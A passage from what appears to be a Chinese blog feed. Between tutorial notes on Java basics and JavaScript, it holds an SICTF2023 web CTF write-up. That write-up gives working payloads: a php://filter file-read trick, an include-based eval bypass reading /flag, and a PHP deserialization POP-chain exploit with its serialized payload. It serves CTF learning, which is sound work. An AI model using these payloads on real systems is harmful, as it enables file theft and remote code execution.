class="string">&quot;这是一个学生名为&quot;</span>+name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;byd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问实例变量和方法"><a href="#访问实例变量和方法" class="headerlink" title="访问实例变量和方法"></a>访问实例变量和方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 实例化对象 */</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">referenceVariable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Constructor</span>();</span><br><span class="line"><span class="comment">/* 访问类中的变量 */</span></span><br><span class="line">referenceVariable.variableName;</span><br><span class="line"><span class="comment">/* 访问类中的方法 */</span></span><br><span class="line">referenceVariable.methodName();</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String LZG= <span class="string">&quot;byd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是一个学生名为&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;byd&quot;</span>);</span><br><span class="line">        System.out.println(stu.LZG);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694440160730-c3d9298a-c2b5-4a40-bd27-289eebedb817.png" alt="img"></p><h2 id="import导包"><a href="#import导包" class="headerlink" title="import导包"></a>import导包</h2><p>首先在Z1d10t相对路径还有一个learn package</p><p>内容如下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694441978087-8f301e62-5397-4bd9-b51d-29e7a4e8f659.png" alt="img"></p><p>然后我们导入到Z1d10t package中</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694442054839-ff85adad-577f-43e0-a5ec-8b4936f135d7.png" alt="img"></p><p>然后调用 可见可以正常输出</p><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>有内置数据类型和引用数据类型</p><h3 id="内置数据类型"><a href="#内置数据类型" class="headerlink" title="内置数据类型"></a>内置数据类型</h3><p>用到了直接查</p><p><a href="https://www.runoob.com/java/java-basic-datatypes.html">https://www.runoob.com/java/java-basic-datatypes.html</a></p><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><ul><li>在Java中，引用类型的变量非常类似于C&#x2F;C++的指针。引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。</li><li>对象、数组都是引用数据类型。</li><li>所有引用类型的默认值都是null。</li><li>一个引用变量可以用来引用任何与之兼容的类型。</li><li>例子：<code>Student stu = new Student(&quot;byd&quot;);</code></li></ul><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>在程序运行时是不能修改的</p><p>在java中是用final来修饰变量的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">final double PI = 3.1415927;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694443639622-ba334d81-5e28-4504-af76-85c64bbd8e1b.png" alt="img"></p><h2 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694443848520-a68cb536-1261-4540-bc58-ee0c02520f07.png" alt="img"></p><p>小转大可以 但是大转小需要强制转换并且还会损失精度</p><h1 id="JAVA变量类型"><a href="#JAVA变量类型" class="headerlink" title="JAVA变量类型"></a>JAVA变量类型</h1><p>变量类型:</p><ul><li>局部变量（Local Variables）：定义在方法、构造方法或语句块中的变量，作用域只限于当前方法、构造方法或语句块中。局部变量必须在使用前声明，并且不能被访问修饰符修饰。</li><li>成员变量（Instance Variables）：定义在类中、方法之外的变量，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问。成员变量可以被访问修饰符修饰。</li><li>静态变量（Class Variables）：定义在类中、方法之外的变量，并且使用 static 关键字修饰，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问，静态变量的值在程序运行期间只有一个副本。静态变量可以被访问修饰符修饰。</li><li>参数变量（Parameters）：方法定义时声明的变量，作为调用该方法时传递给方法的值。参数变量的作用域只限于方法内部 简单说就是函数用于传值的形参</li></ul><h2 id="参数变量"><a href="#参数变量" class="headerlink" title="参数变量"></a>参数变量</h2><p>省流：形参</p><p>有两个点：</p><ul><li>值传递：在方法调用时，传递的是实际参数的值的副本。当参数变量被赋予新的值时，只会修改副本的值，不会影响原始值。Java 中的基本数据类型都采用值传递方式传递参数变量的值。</li><li>引用传递：在方法调用时，传递的是实际参数的引用（即内存地址）。当参数变量被赋予新的值时，会修改原始值的内容。Java 中的对象类型采用引用传递方式传递参数变量的值。</li></ul><h2 id="类变量（静态变量）"><a href="#类变量（静态变量）" class="headerlink" title="类变量（静态变量）"></a>类变量（静态变量）</h2><p>java中静态变量是属于类的，而不是对象的实例</p><p>由于静态变量是与类相关的，因此可以通过类名来访问静态变量，也可以通过实例名来访问静态变量</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694445310175-98a20470-9e06-4a04-8dc0-d3040a499a61.png" alt="img"></p><h1 id="JAVA修饰符-1"><a href="#JAVA修饰符-1" class="headerlink" title="JAVA修饰符"></a>JAVA修饰符</h1><h2 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h2><p>直接用一张图片来看访问权限关系</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694479898379-9130d89e-df79-4522-ab12-76d129bfa1f1.png" alt="img"></p><h3 id="默认访问修饰符default"><a href="#默认访问修饰符default" class="headerlink" title="默认访问修饰符default"></a>默认访问修饰符default</h3><p>默认访问修饰符的访问级别是包级别（package-level），即只能被同一包中的其他类访问</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694480351100-3b7883b3-58b8-4575-b7d1-1e14edd2a043.png" alt="img"></p><h3 id="私有访问修饰符private"><a href="#私有访问修饰符private" class="headerlink" title="私有访问修饰符private"></a>私有访问修饰符private</h3><p>外部无法直接访问到 只能通过本类的public函数间接去访问</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694480716523-da2203d9-db02-4bd0-b5e3-bd27fb410338.png" alt="img"></p><p>可见直接访问是会报错的</p><h3 id="公有访问修饰符public"><a href="#公有访问修饰符public" class="headerlink" title="公有访问修饰符public"></a>公有访问修饰符public</h3><p>很常见就不说了 总之就是门户大开</p><h3 id="受保护的访问修饰符protected"><a href="#受保护的访问修饰符protected" class="headerlink" title="受保护的访问修饰符protected"></a>受保护的访问修饰符protected</h3><ul><li>子类与基类在同一包中：被声明为 protected 的变量、方法和构造器能被同一个包中的任何其他类访问</li><li>子类与基类不在同一包中：那么在子类中，子类实例可以访问其从基类继承而来的 protected 方法，而不能访问基类实例的protected方法</li></ul><p>一般很少用 我在这里就不多说了</p><h3 id="访问控制和继承"><a href="#访问控制和继承" class="headerlink" title="访问控制和继承"></a>访问控制和继承</h3><ul><li>父类中声明为 public 的方法在子类中也必须为 public。</li><li>父类中声明为 protected 的方法在子类中要么声明为 protected，要么声明为 public，不能声明为 private。</li><li>父类中声明为 private 的方法，不能够被子类继承。</li></ul><h2 id="非访问修饰符"><a href="#非访问修饰符" class="headerlink" title="非访问修饰符"></a>非访问修饰符</h2><h3 id="static修饰符"><a href="#static修饰符" class="headerlink" title="static修饰符"></a>static修饰符</h3><ul><li>静态变量：static 关键字用来声明独立于对象的静态变量，无论一个类实例化多少对象，它的静态变量只有一份拷贝。 静态变量也被称为类变量。局部变量不能被声明为 static 变量。</li><li>静态方法：static 关键字用来声明独立于对象的静态方法。静态方法不能使用类的非静态变量。静态方法从参数列表得到数据，然后计算这些数据。</li></ul><p>类变量和方法的访问可以直接使用 classname.variablename 和 classname.methodname 的方式访问</p><h3 id="final修饰符"><a href="#final修饰符" class="headerlink" title="final修饰符"></a>final修饰符</h3><p>变量一旦赋值后，不能被重新赋值</p><p>final 修饰符通常和 static 修饰符一起使用来创建类常量</p><p>但是如果不用static那么就要用非静态函数才能调用 也就是不用static修饰的 不然会报错</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694494921294-1f9e0d0c-e368-4b60-902d-d2316bd856b0.png" alt="img"></p><p>可见无法被改变</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526104172-6998c42b-f2eb-42c3-a65b-0255a76beb00.png" alt="img"></p><h3 id="abstract修饰符"><a href="#abstract修饰符" class="headerlink" title="abstract修饰符"></a>abstract修饰符</h3><p>一个类不能同时被final和abstract修饰</p><p>如果类包含抽象函数那么这个类一定要申明为抽象类 不然会报错</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526671858-76b213e7-7cdf-4112-ba3c-a35514bf8bfa.png" alt="img"></p><p>抽象类可以包含抽象方法和非抽象方法</p><p>抽象方法是一种没有任何实现的方法，该方法的具体实现由子类提供</p><p>如果有主体会报错</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526783274-4a224551-70b9-4cda-817c-3eba54d38bd0.png" alt="img"></p><p>抽象方法由其子类实现</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527074759-a4ec7029-dd3d-4d08-8c2d-97fd24dec9a7.png" alt="img"></p><h3 id="synchronized修饰符"><a href="#synchronized修饰符" class="headerlink" title="synchronized修饰符"></a>synchronized修饰符</h3><p>synchronized 关键字声明的方法同一时间只能被一个线程访问</p><h3 id="transient修饰符"><a href="#transient修饰符" class="headerlink" title="transient修饰符"></a>transient修饰符</h3><p>序列化的对象包含被 transient 修饰的实例变量时，java 虚拟机(JVM)跳过该特定的变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> <span class="variable">limit</span> <span class="operator">=</span> <span class="number">55</span>;   <span class="comment">// 不会持久化</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> b; <span class="comment">// 持久化</span></span><br></pre></td></tr></table></figure><h3 id="volatile修饰符"><a href="#volatile修饰符" class="headerlink" title="volatile修饰符"></a>volatile修饰符</h3><p>volatile 修饰的成员变量在每次被线程访问时，都强制从共享内存中重新读取该成员变量的值。而且，当成员变量发生变化时，会强制线程将变化值回写到共享内存。这样在任何时刻，两个不同的线程总是看到某个成员变量的同一个值。</p><h1 id="JAVA运算符"><a href="#JAVA运算符" class="headerlink" title="JAVA运算符"></a>JAVA运算符</h1><p>大致和其他语言差不多 就不过多赘述了</p><h1 id="JAVA循环结构"><a href="#JAVA循环结构" class="headerlink" title="JAVA循环结构"></a>JAVA循环结构</h1><h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>( 布尔表达式 ) &#123;</span><br><span class="line">  <span class="comment">//循环内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527699055-8b292709-866d-4ddf-b398-e51c0b7a344a.png" alt="img"></p><h2 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">       <span class="comment">//代码语句</span></span><br><span class="line">&#125;<span class="keyword">while</span>(布尔表达式);</span><br></pre></td></tr></table></figure><p>此结构会在判断条件是否成立之前执行一次 所以这个结构至少执行一次</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527858896-5b8a76cd-27bb-4b98-904a-cf1e1b5fe69a.png" alt="img"></p><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化; 布尔表达式; 更新) &#123;</span><br><span class="line">    <span class="comment">//代码语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694528192668-49c5d725-b95f-49c0-ac9a-8518d68f133b.png" alt="img"></p><h2 id="JAVA增强for循环"><a href="#JAVA增强for循环" class="headerlink" title="JAVA增强for循环"></a>JAVA增强for循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(声明语句 : 表达式)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//代码句子</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>声明语句：声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。</p><p>表达式：表达式是要访问的数组名，或者是返回值为数组的方法。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694528414285-3494e0e1-61f2-47b0-a6e5-f1e6e85a9a9c.png" alt="img"></p><h2 id="continue和break"><a href="#continue和break" class="headerlink" title="continue和break"></a>continue和break</h2><p>和其他语言利用一样 不多说</p><h1 id="JAVA条件语句"><a href="#JAVA条件语句" class="headerlink" title="JAVA条件语句"></a>JAVA条件语句</h1><p>same</p><h1 id="JAVA数组-1"><a href="#JAVA数组-1" class="headerlink" title="JAVA数组"></a>JAVA数组</h1><h2 id="声明数组变量"><a href="#声明数组变量" class="headerlink" title="声明数组变量"></a>声明数组变量</h2><p>两种方式但是一般推荐第一种方式 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar;   <span class="comment">// 首选的方法</span></span><br><span class="line"> </span><br><span class="line">或</span><br><span class="line"> </span><br><span class="line">dataType arrayRefVar[];  <span class="comment">// 效果相同，但不是首选方法</span></span><br></pre></td></tr></table></figure><h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayRefVar = new dataType[arraySize];</span><br></pre></td></tr></table></figure><p>做了两件事情:</p><ol><li>首先用<code>new dataType[arraySize];</code>创建了一个数组</li><li>然后将其赋值给arrayRefVar</li></ol><p>必须先声明然后再创建 如果不声明就创建会报错</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694587804653-2cd473d6-a9ba-4923-b684-339087894567.png" alt="img"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>下标依然是从0开始</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694588095152-9207b9b7-b00b-411f-8b0c-4d0d4ef55b97.png" alt="img"></p><h2 id="for-each循环"><a href="#for-each循环" class="headerlink" title="for-each循环"></a>for-each循环</h2><p>其实就是之前我们讲过的循环结构的增强for循环</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694588437392-1f480dd1-9035-4f8c-857d-ae7f7a8d8c3d.png" alt="img"></p><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>直接为每一维分配空间 这种我们用的最多也最方便</p><p>或者是一维一维分配空间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type[][] typeName = <span class="keyword">new</span> <span class="title class_">type</span>[typeLength1][typeLength2];</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694589029597-c4715464-7d86-45e2-9000-936781c25d8c.png" alt="img"></p><h1 id="JAVA正则"><a href="#JAVA正则" class="headerlink" title="JAVA正则"></a>JAVA正则</h1><p>规则什么的都和其他语言差不多</p><p>看个例子</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694590443706-45f8e32f-f306-44fb-9725-86587b0b05c7.png" alt="img"></p><p>首先要引入依赖</p><p>然后要分别创建两个类:Pattern和Matcher</p><p>Pattern是要进行的匹配模式的对象</p><p>Matcher是被匹配内容的对象</p><p>其次还有一个点就是在java正则模式中转义要用<code>//</code>其他语言我们都是只用一个<code>/</code></p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SICTF2023 WEB WP</title>
      <link href="/post/508290f8.html"/>
      <url>/post/508290f8.html</url>
      
        <content type="html"><![CDATA[<p>SICTF2023</p><span id="more"></span><p>题目梯度设置的不太合理 两极分化过于严重力</p><h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a><strong>Include</strong></h1><p>考察伪协议<code>php://filter/read=convert.base64-encode/resource=</code></p><h1 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h1><p>这个题 很让人难绷 原题的非预期在这道题目上有问题 命令执行没结果。。</p><p>考点:</p><ul><li>套娃也就是无参RCE</li><li>php非法命名</li><li>%0a换行绕过</li></ul><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694165957362-b601bbd8-00b6-4c8d-8e7b-2422490aa360.png" alt="img"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code);</span><br><span class="line">$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code);</span><br><span class="line">eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了括号和点</p><p>这里需要知道就是include可以不用括号就能包含文件</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:code=include$_GET[&#x27;x&#x27;];</span><br><span class="line">get:x=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h1 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h1><p>java捏 不会</p><h1 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h1><p>源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $pop;</span><br><span class="line">    public $i;</span><br><span class="line">    public $nogame;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;</span><br><span class="line">            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function game()&#123;</span><br><span class="line">        echo &quot;扣1送地狱火&quot;;</span><br><span class="line">        if ($this-&gt;i = &quot;1&quot;)&#123;</span><br><span class="line">            echo &#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;;</span><br><span class="line">            $this-&gt;nogame-&gt;love();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        echo &quot;必须执行&quot;;</span><br><span class="line">        eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $Aec;</span><br><span class="line">    public $girl;</span><br><span class="line">    public $boy;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;I also want to fall in love&quot;;</span><br><span class="line">        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;</span><br><span class="line">            $this-&gt;Aec-&gt;game();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class P&#123;</span><br><span class="line">    public $MyLover;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;</span><br><span class="line">        if ($name != &quot;game&quot;) &#123;</span><br><span class="line">            echo &quot;打游戏去，别想着对象了&quot;;</span><br><span class="line">            $this-&gt;MyLover = clone new B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ($_GET[&quot;A_B_C&quot;])&#123;</span><br><span class="line">    $poc=$_GET[&quot;A_B_C&quot;];</span><br><span class="line">    unserialize($poc);</span><br></pre></td></tr></table></figure><p>其实就一个点 __toSting()的调用靠<code>preg_match(&quot;/233333333/&quot;,$this-&gt;pop)</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694266905359-c54e6f41-856a-42d3-b69d-68300ea81079.png" alt="img"></p><p>可以看到是string类型的 </p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class B&#123;</span><br><span class="line">    public $pop;</span><br><span class="line">    public $i;</span><br><span class="line">    public $nogame;</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public $Aec;</span><br><span class="line">    public $girl;</span><br><span class="line">    public $boy;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class P&#123;</span><br><span class="line">    public $MyLover;</span><br><span class="line">&#125;</span><br><span class="line">$a=new B();</span><br><span class="line">$a-&gt;pop=new A();</span><br><span class="line">$a-&gt;pop-&gt;girl= &#x27;QNKCDZO&#x27;;</span><br><span class="line">$a-&gt;pop-&gt;boy=&#x27;240610708&#x27;;</span><br><span class="line">$a-&gt;pop-&gt;Aec=new B();</span><br><span class="line">$a-&gt;pop-&gt;Aec-&gt;i=&#x27;1&#x27;;</span><br><span class="line">$a-&gt;pop-&gt;Aec-&gt;nogame=new P();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">#O%3A1%3A%22B%22%3A3%3A%7Bs%3A3%3A%22pop%22%3BO%3A1%3A%22A%22%3A3%3A%7Bs%3A3%3A%22Aec%22%3BO%3A1%3A%22B%22%3A3%3A%7Bs%3A3%3A%22pop%22%3BN%3Bs%3A1%3A%22i%22%3Bs%3A1%3A%221%22%3Bs%3A6%3A%22nogame%22%3BO%3A1%3A%22P%22%3A1%3A%7Bs%3A7%3A%22MyLover%22%3BN%3B%7D%7Ds%3A4%3A%22girl%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A3%3A%22boy%22%3Bs%3A9%3A%22240610708%22%3B%7Ds%3A1%3A%22i%22%3BN%3Bs%3A6%3A%22nogame%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><h1 id="DoyouknowCC"><a href="#DoyouknowCC" class="headerlink" title="DoyouknowCC"></a>DoyouknowCC</h1><p>java 会不了一点</p><h1 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h1><p>考点:</p><ul><li>条件竞争</li></ul><p>上传和读取同时进行，看脸要等很长时间才成功。。。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694316396871-7e5866eb-393a-4663-90a9-7854bbfa9e84.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS简单基础学习</title>
      <link href="/post/eb0674ad.html"/>
      <url>/post/eb0674ad.html</url>
      
        <content type="html"><![CDATA[<p>纯是为了看懂代码的…没啥用的电子垃圾</p><span id="more"></span><h1 id="JS语言特性"><a href="#JS语言特性" class="headerlink" title="JS语言特性"></a>JS语言特性</h1><ul><li>js是一门弱语言，声明变量没有类型统一用var</li><li>js没有方法重载概念，同名函数会被覆盖</li></ul><h1 id="JS两种引入方式"><a href="#JS两种引入方式" class="headerlink" title="JS两种引入方式"></a>JS两种引入方式</h1><ul><li>一种是内部直接引入就是通过script标签包裹起来<code>&lt;script&gt;代码&lt;/script&gt;</code></li><li>另一种是通过文件引入的方式也是通过script标签不过要在其属性加上<code>scr=路径</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span 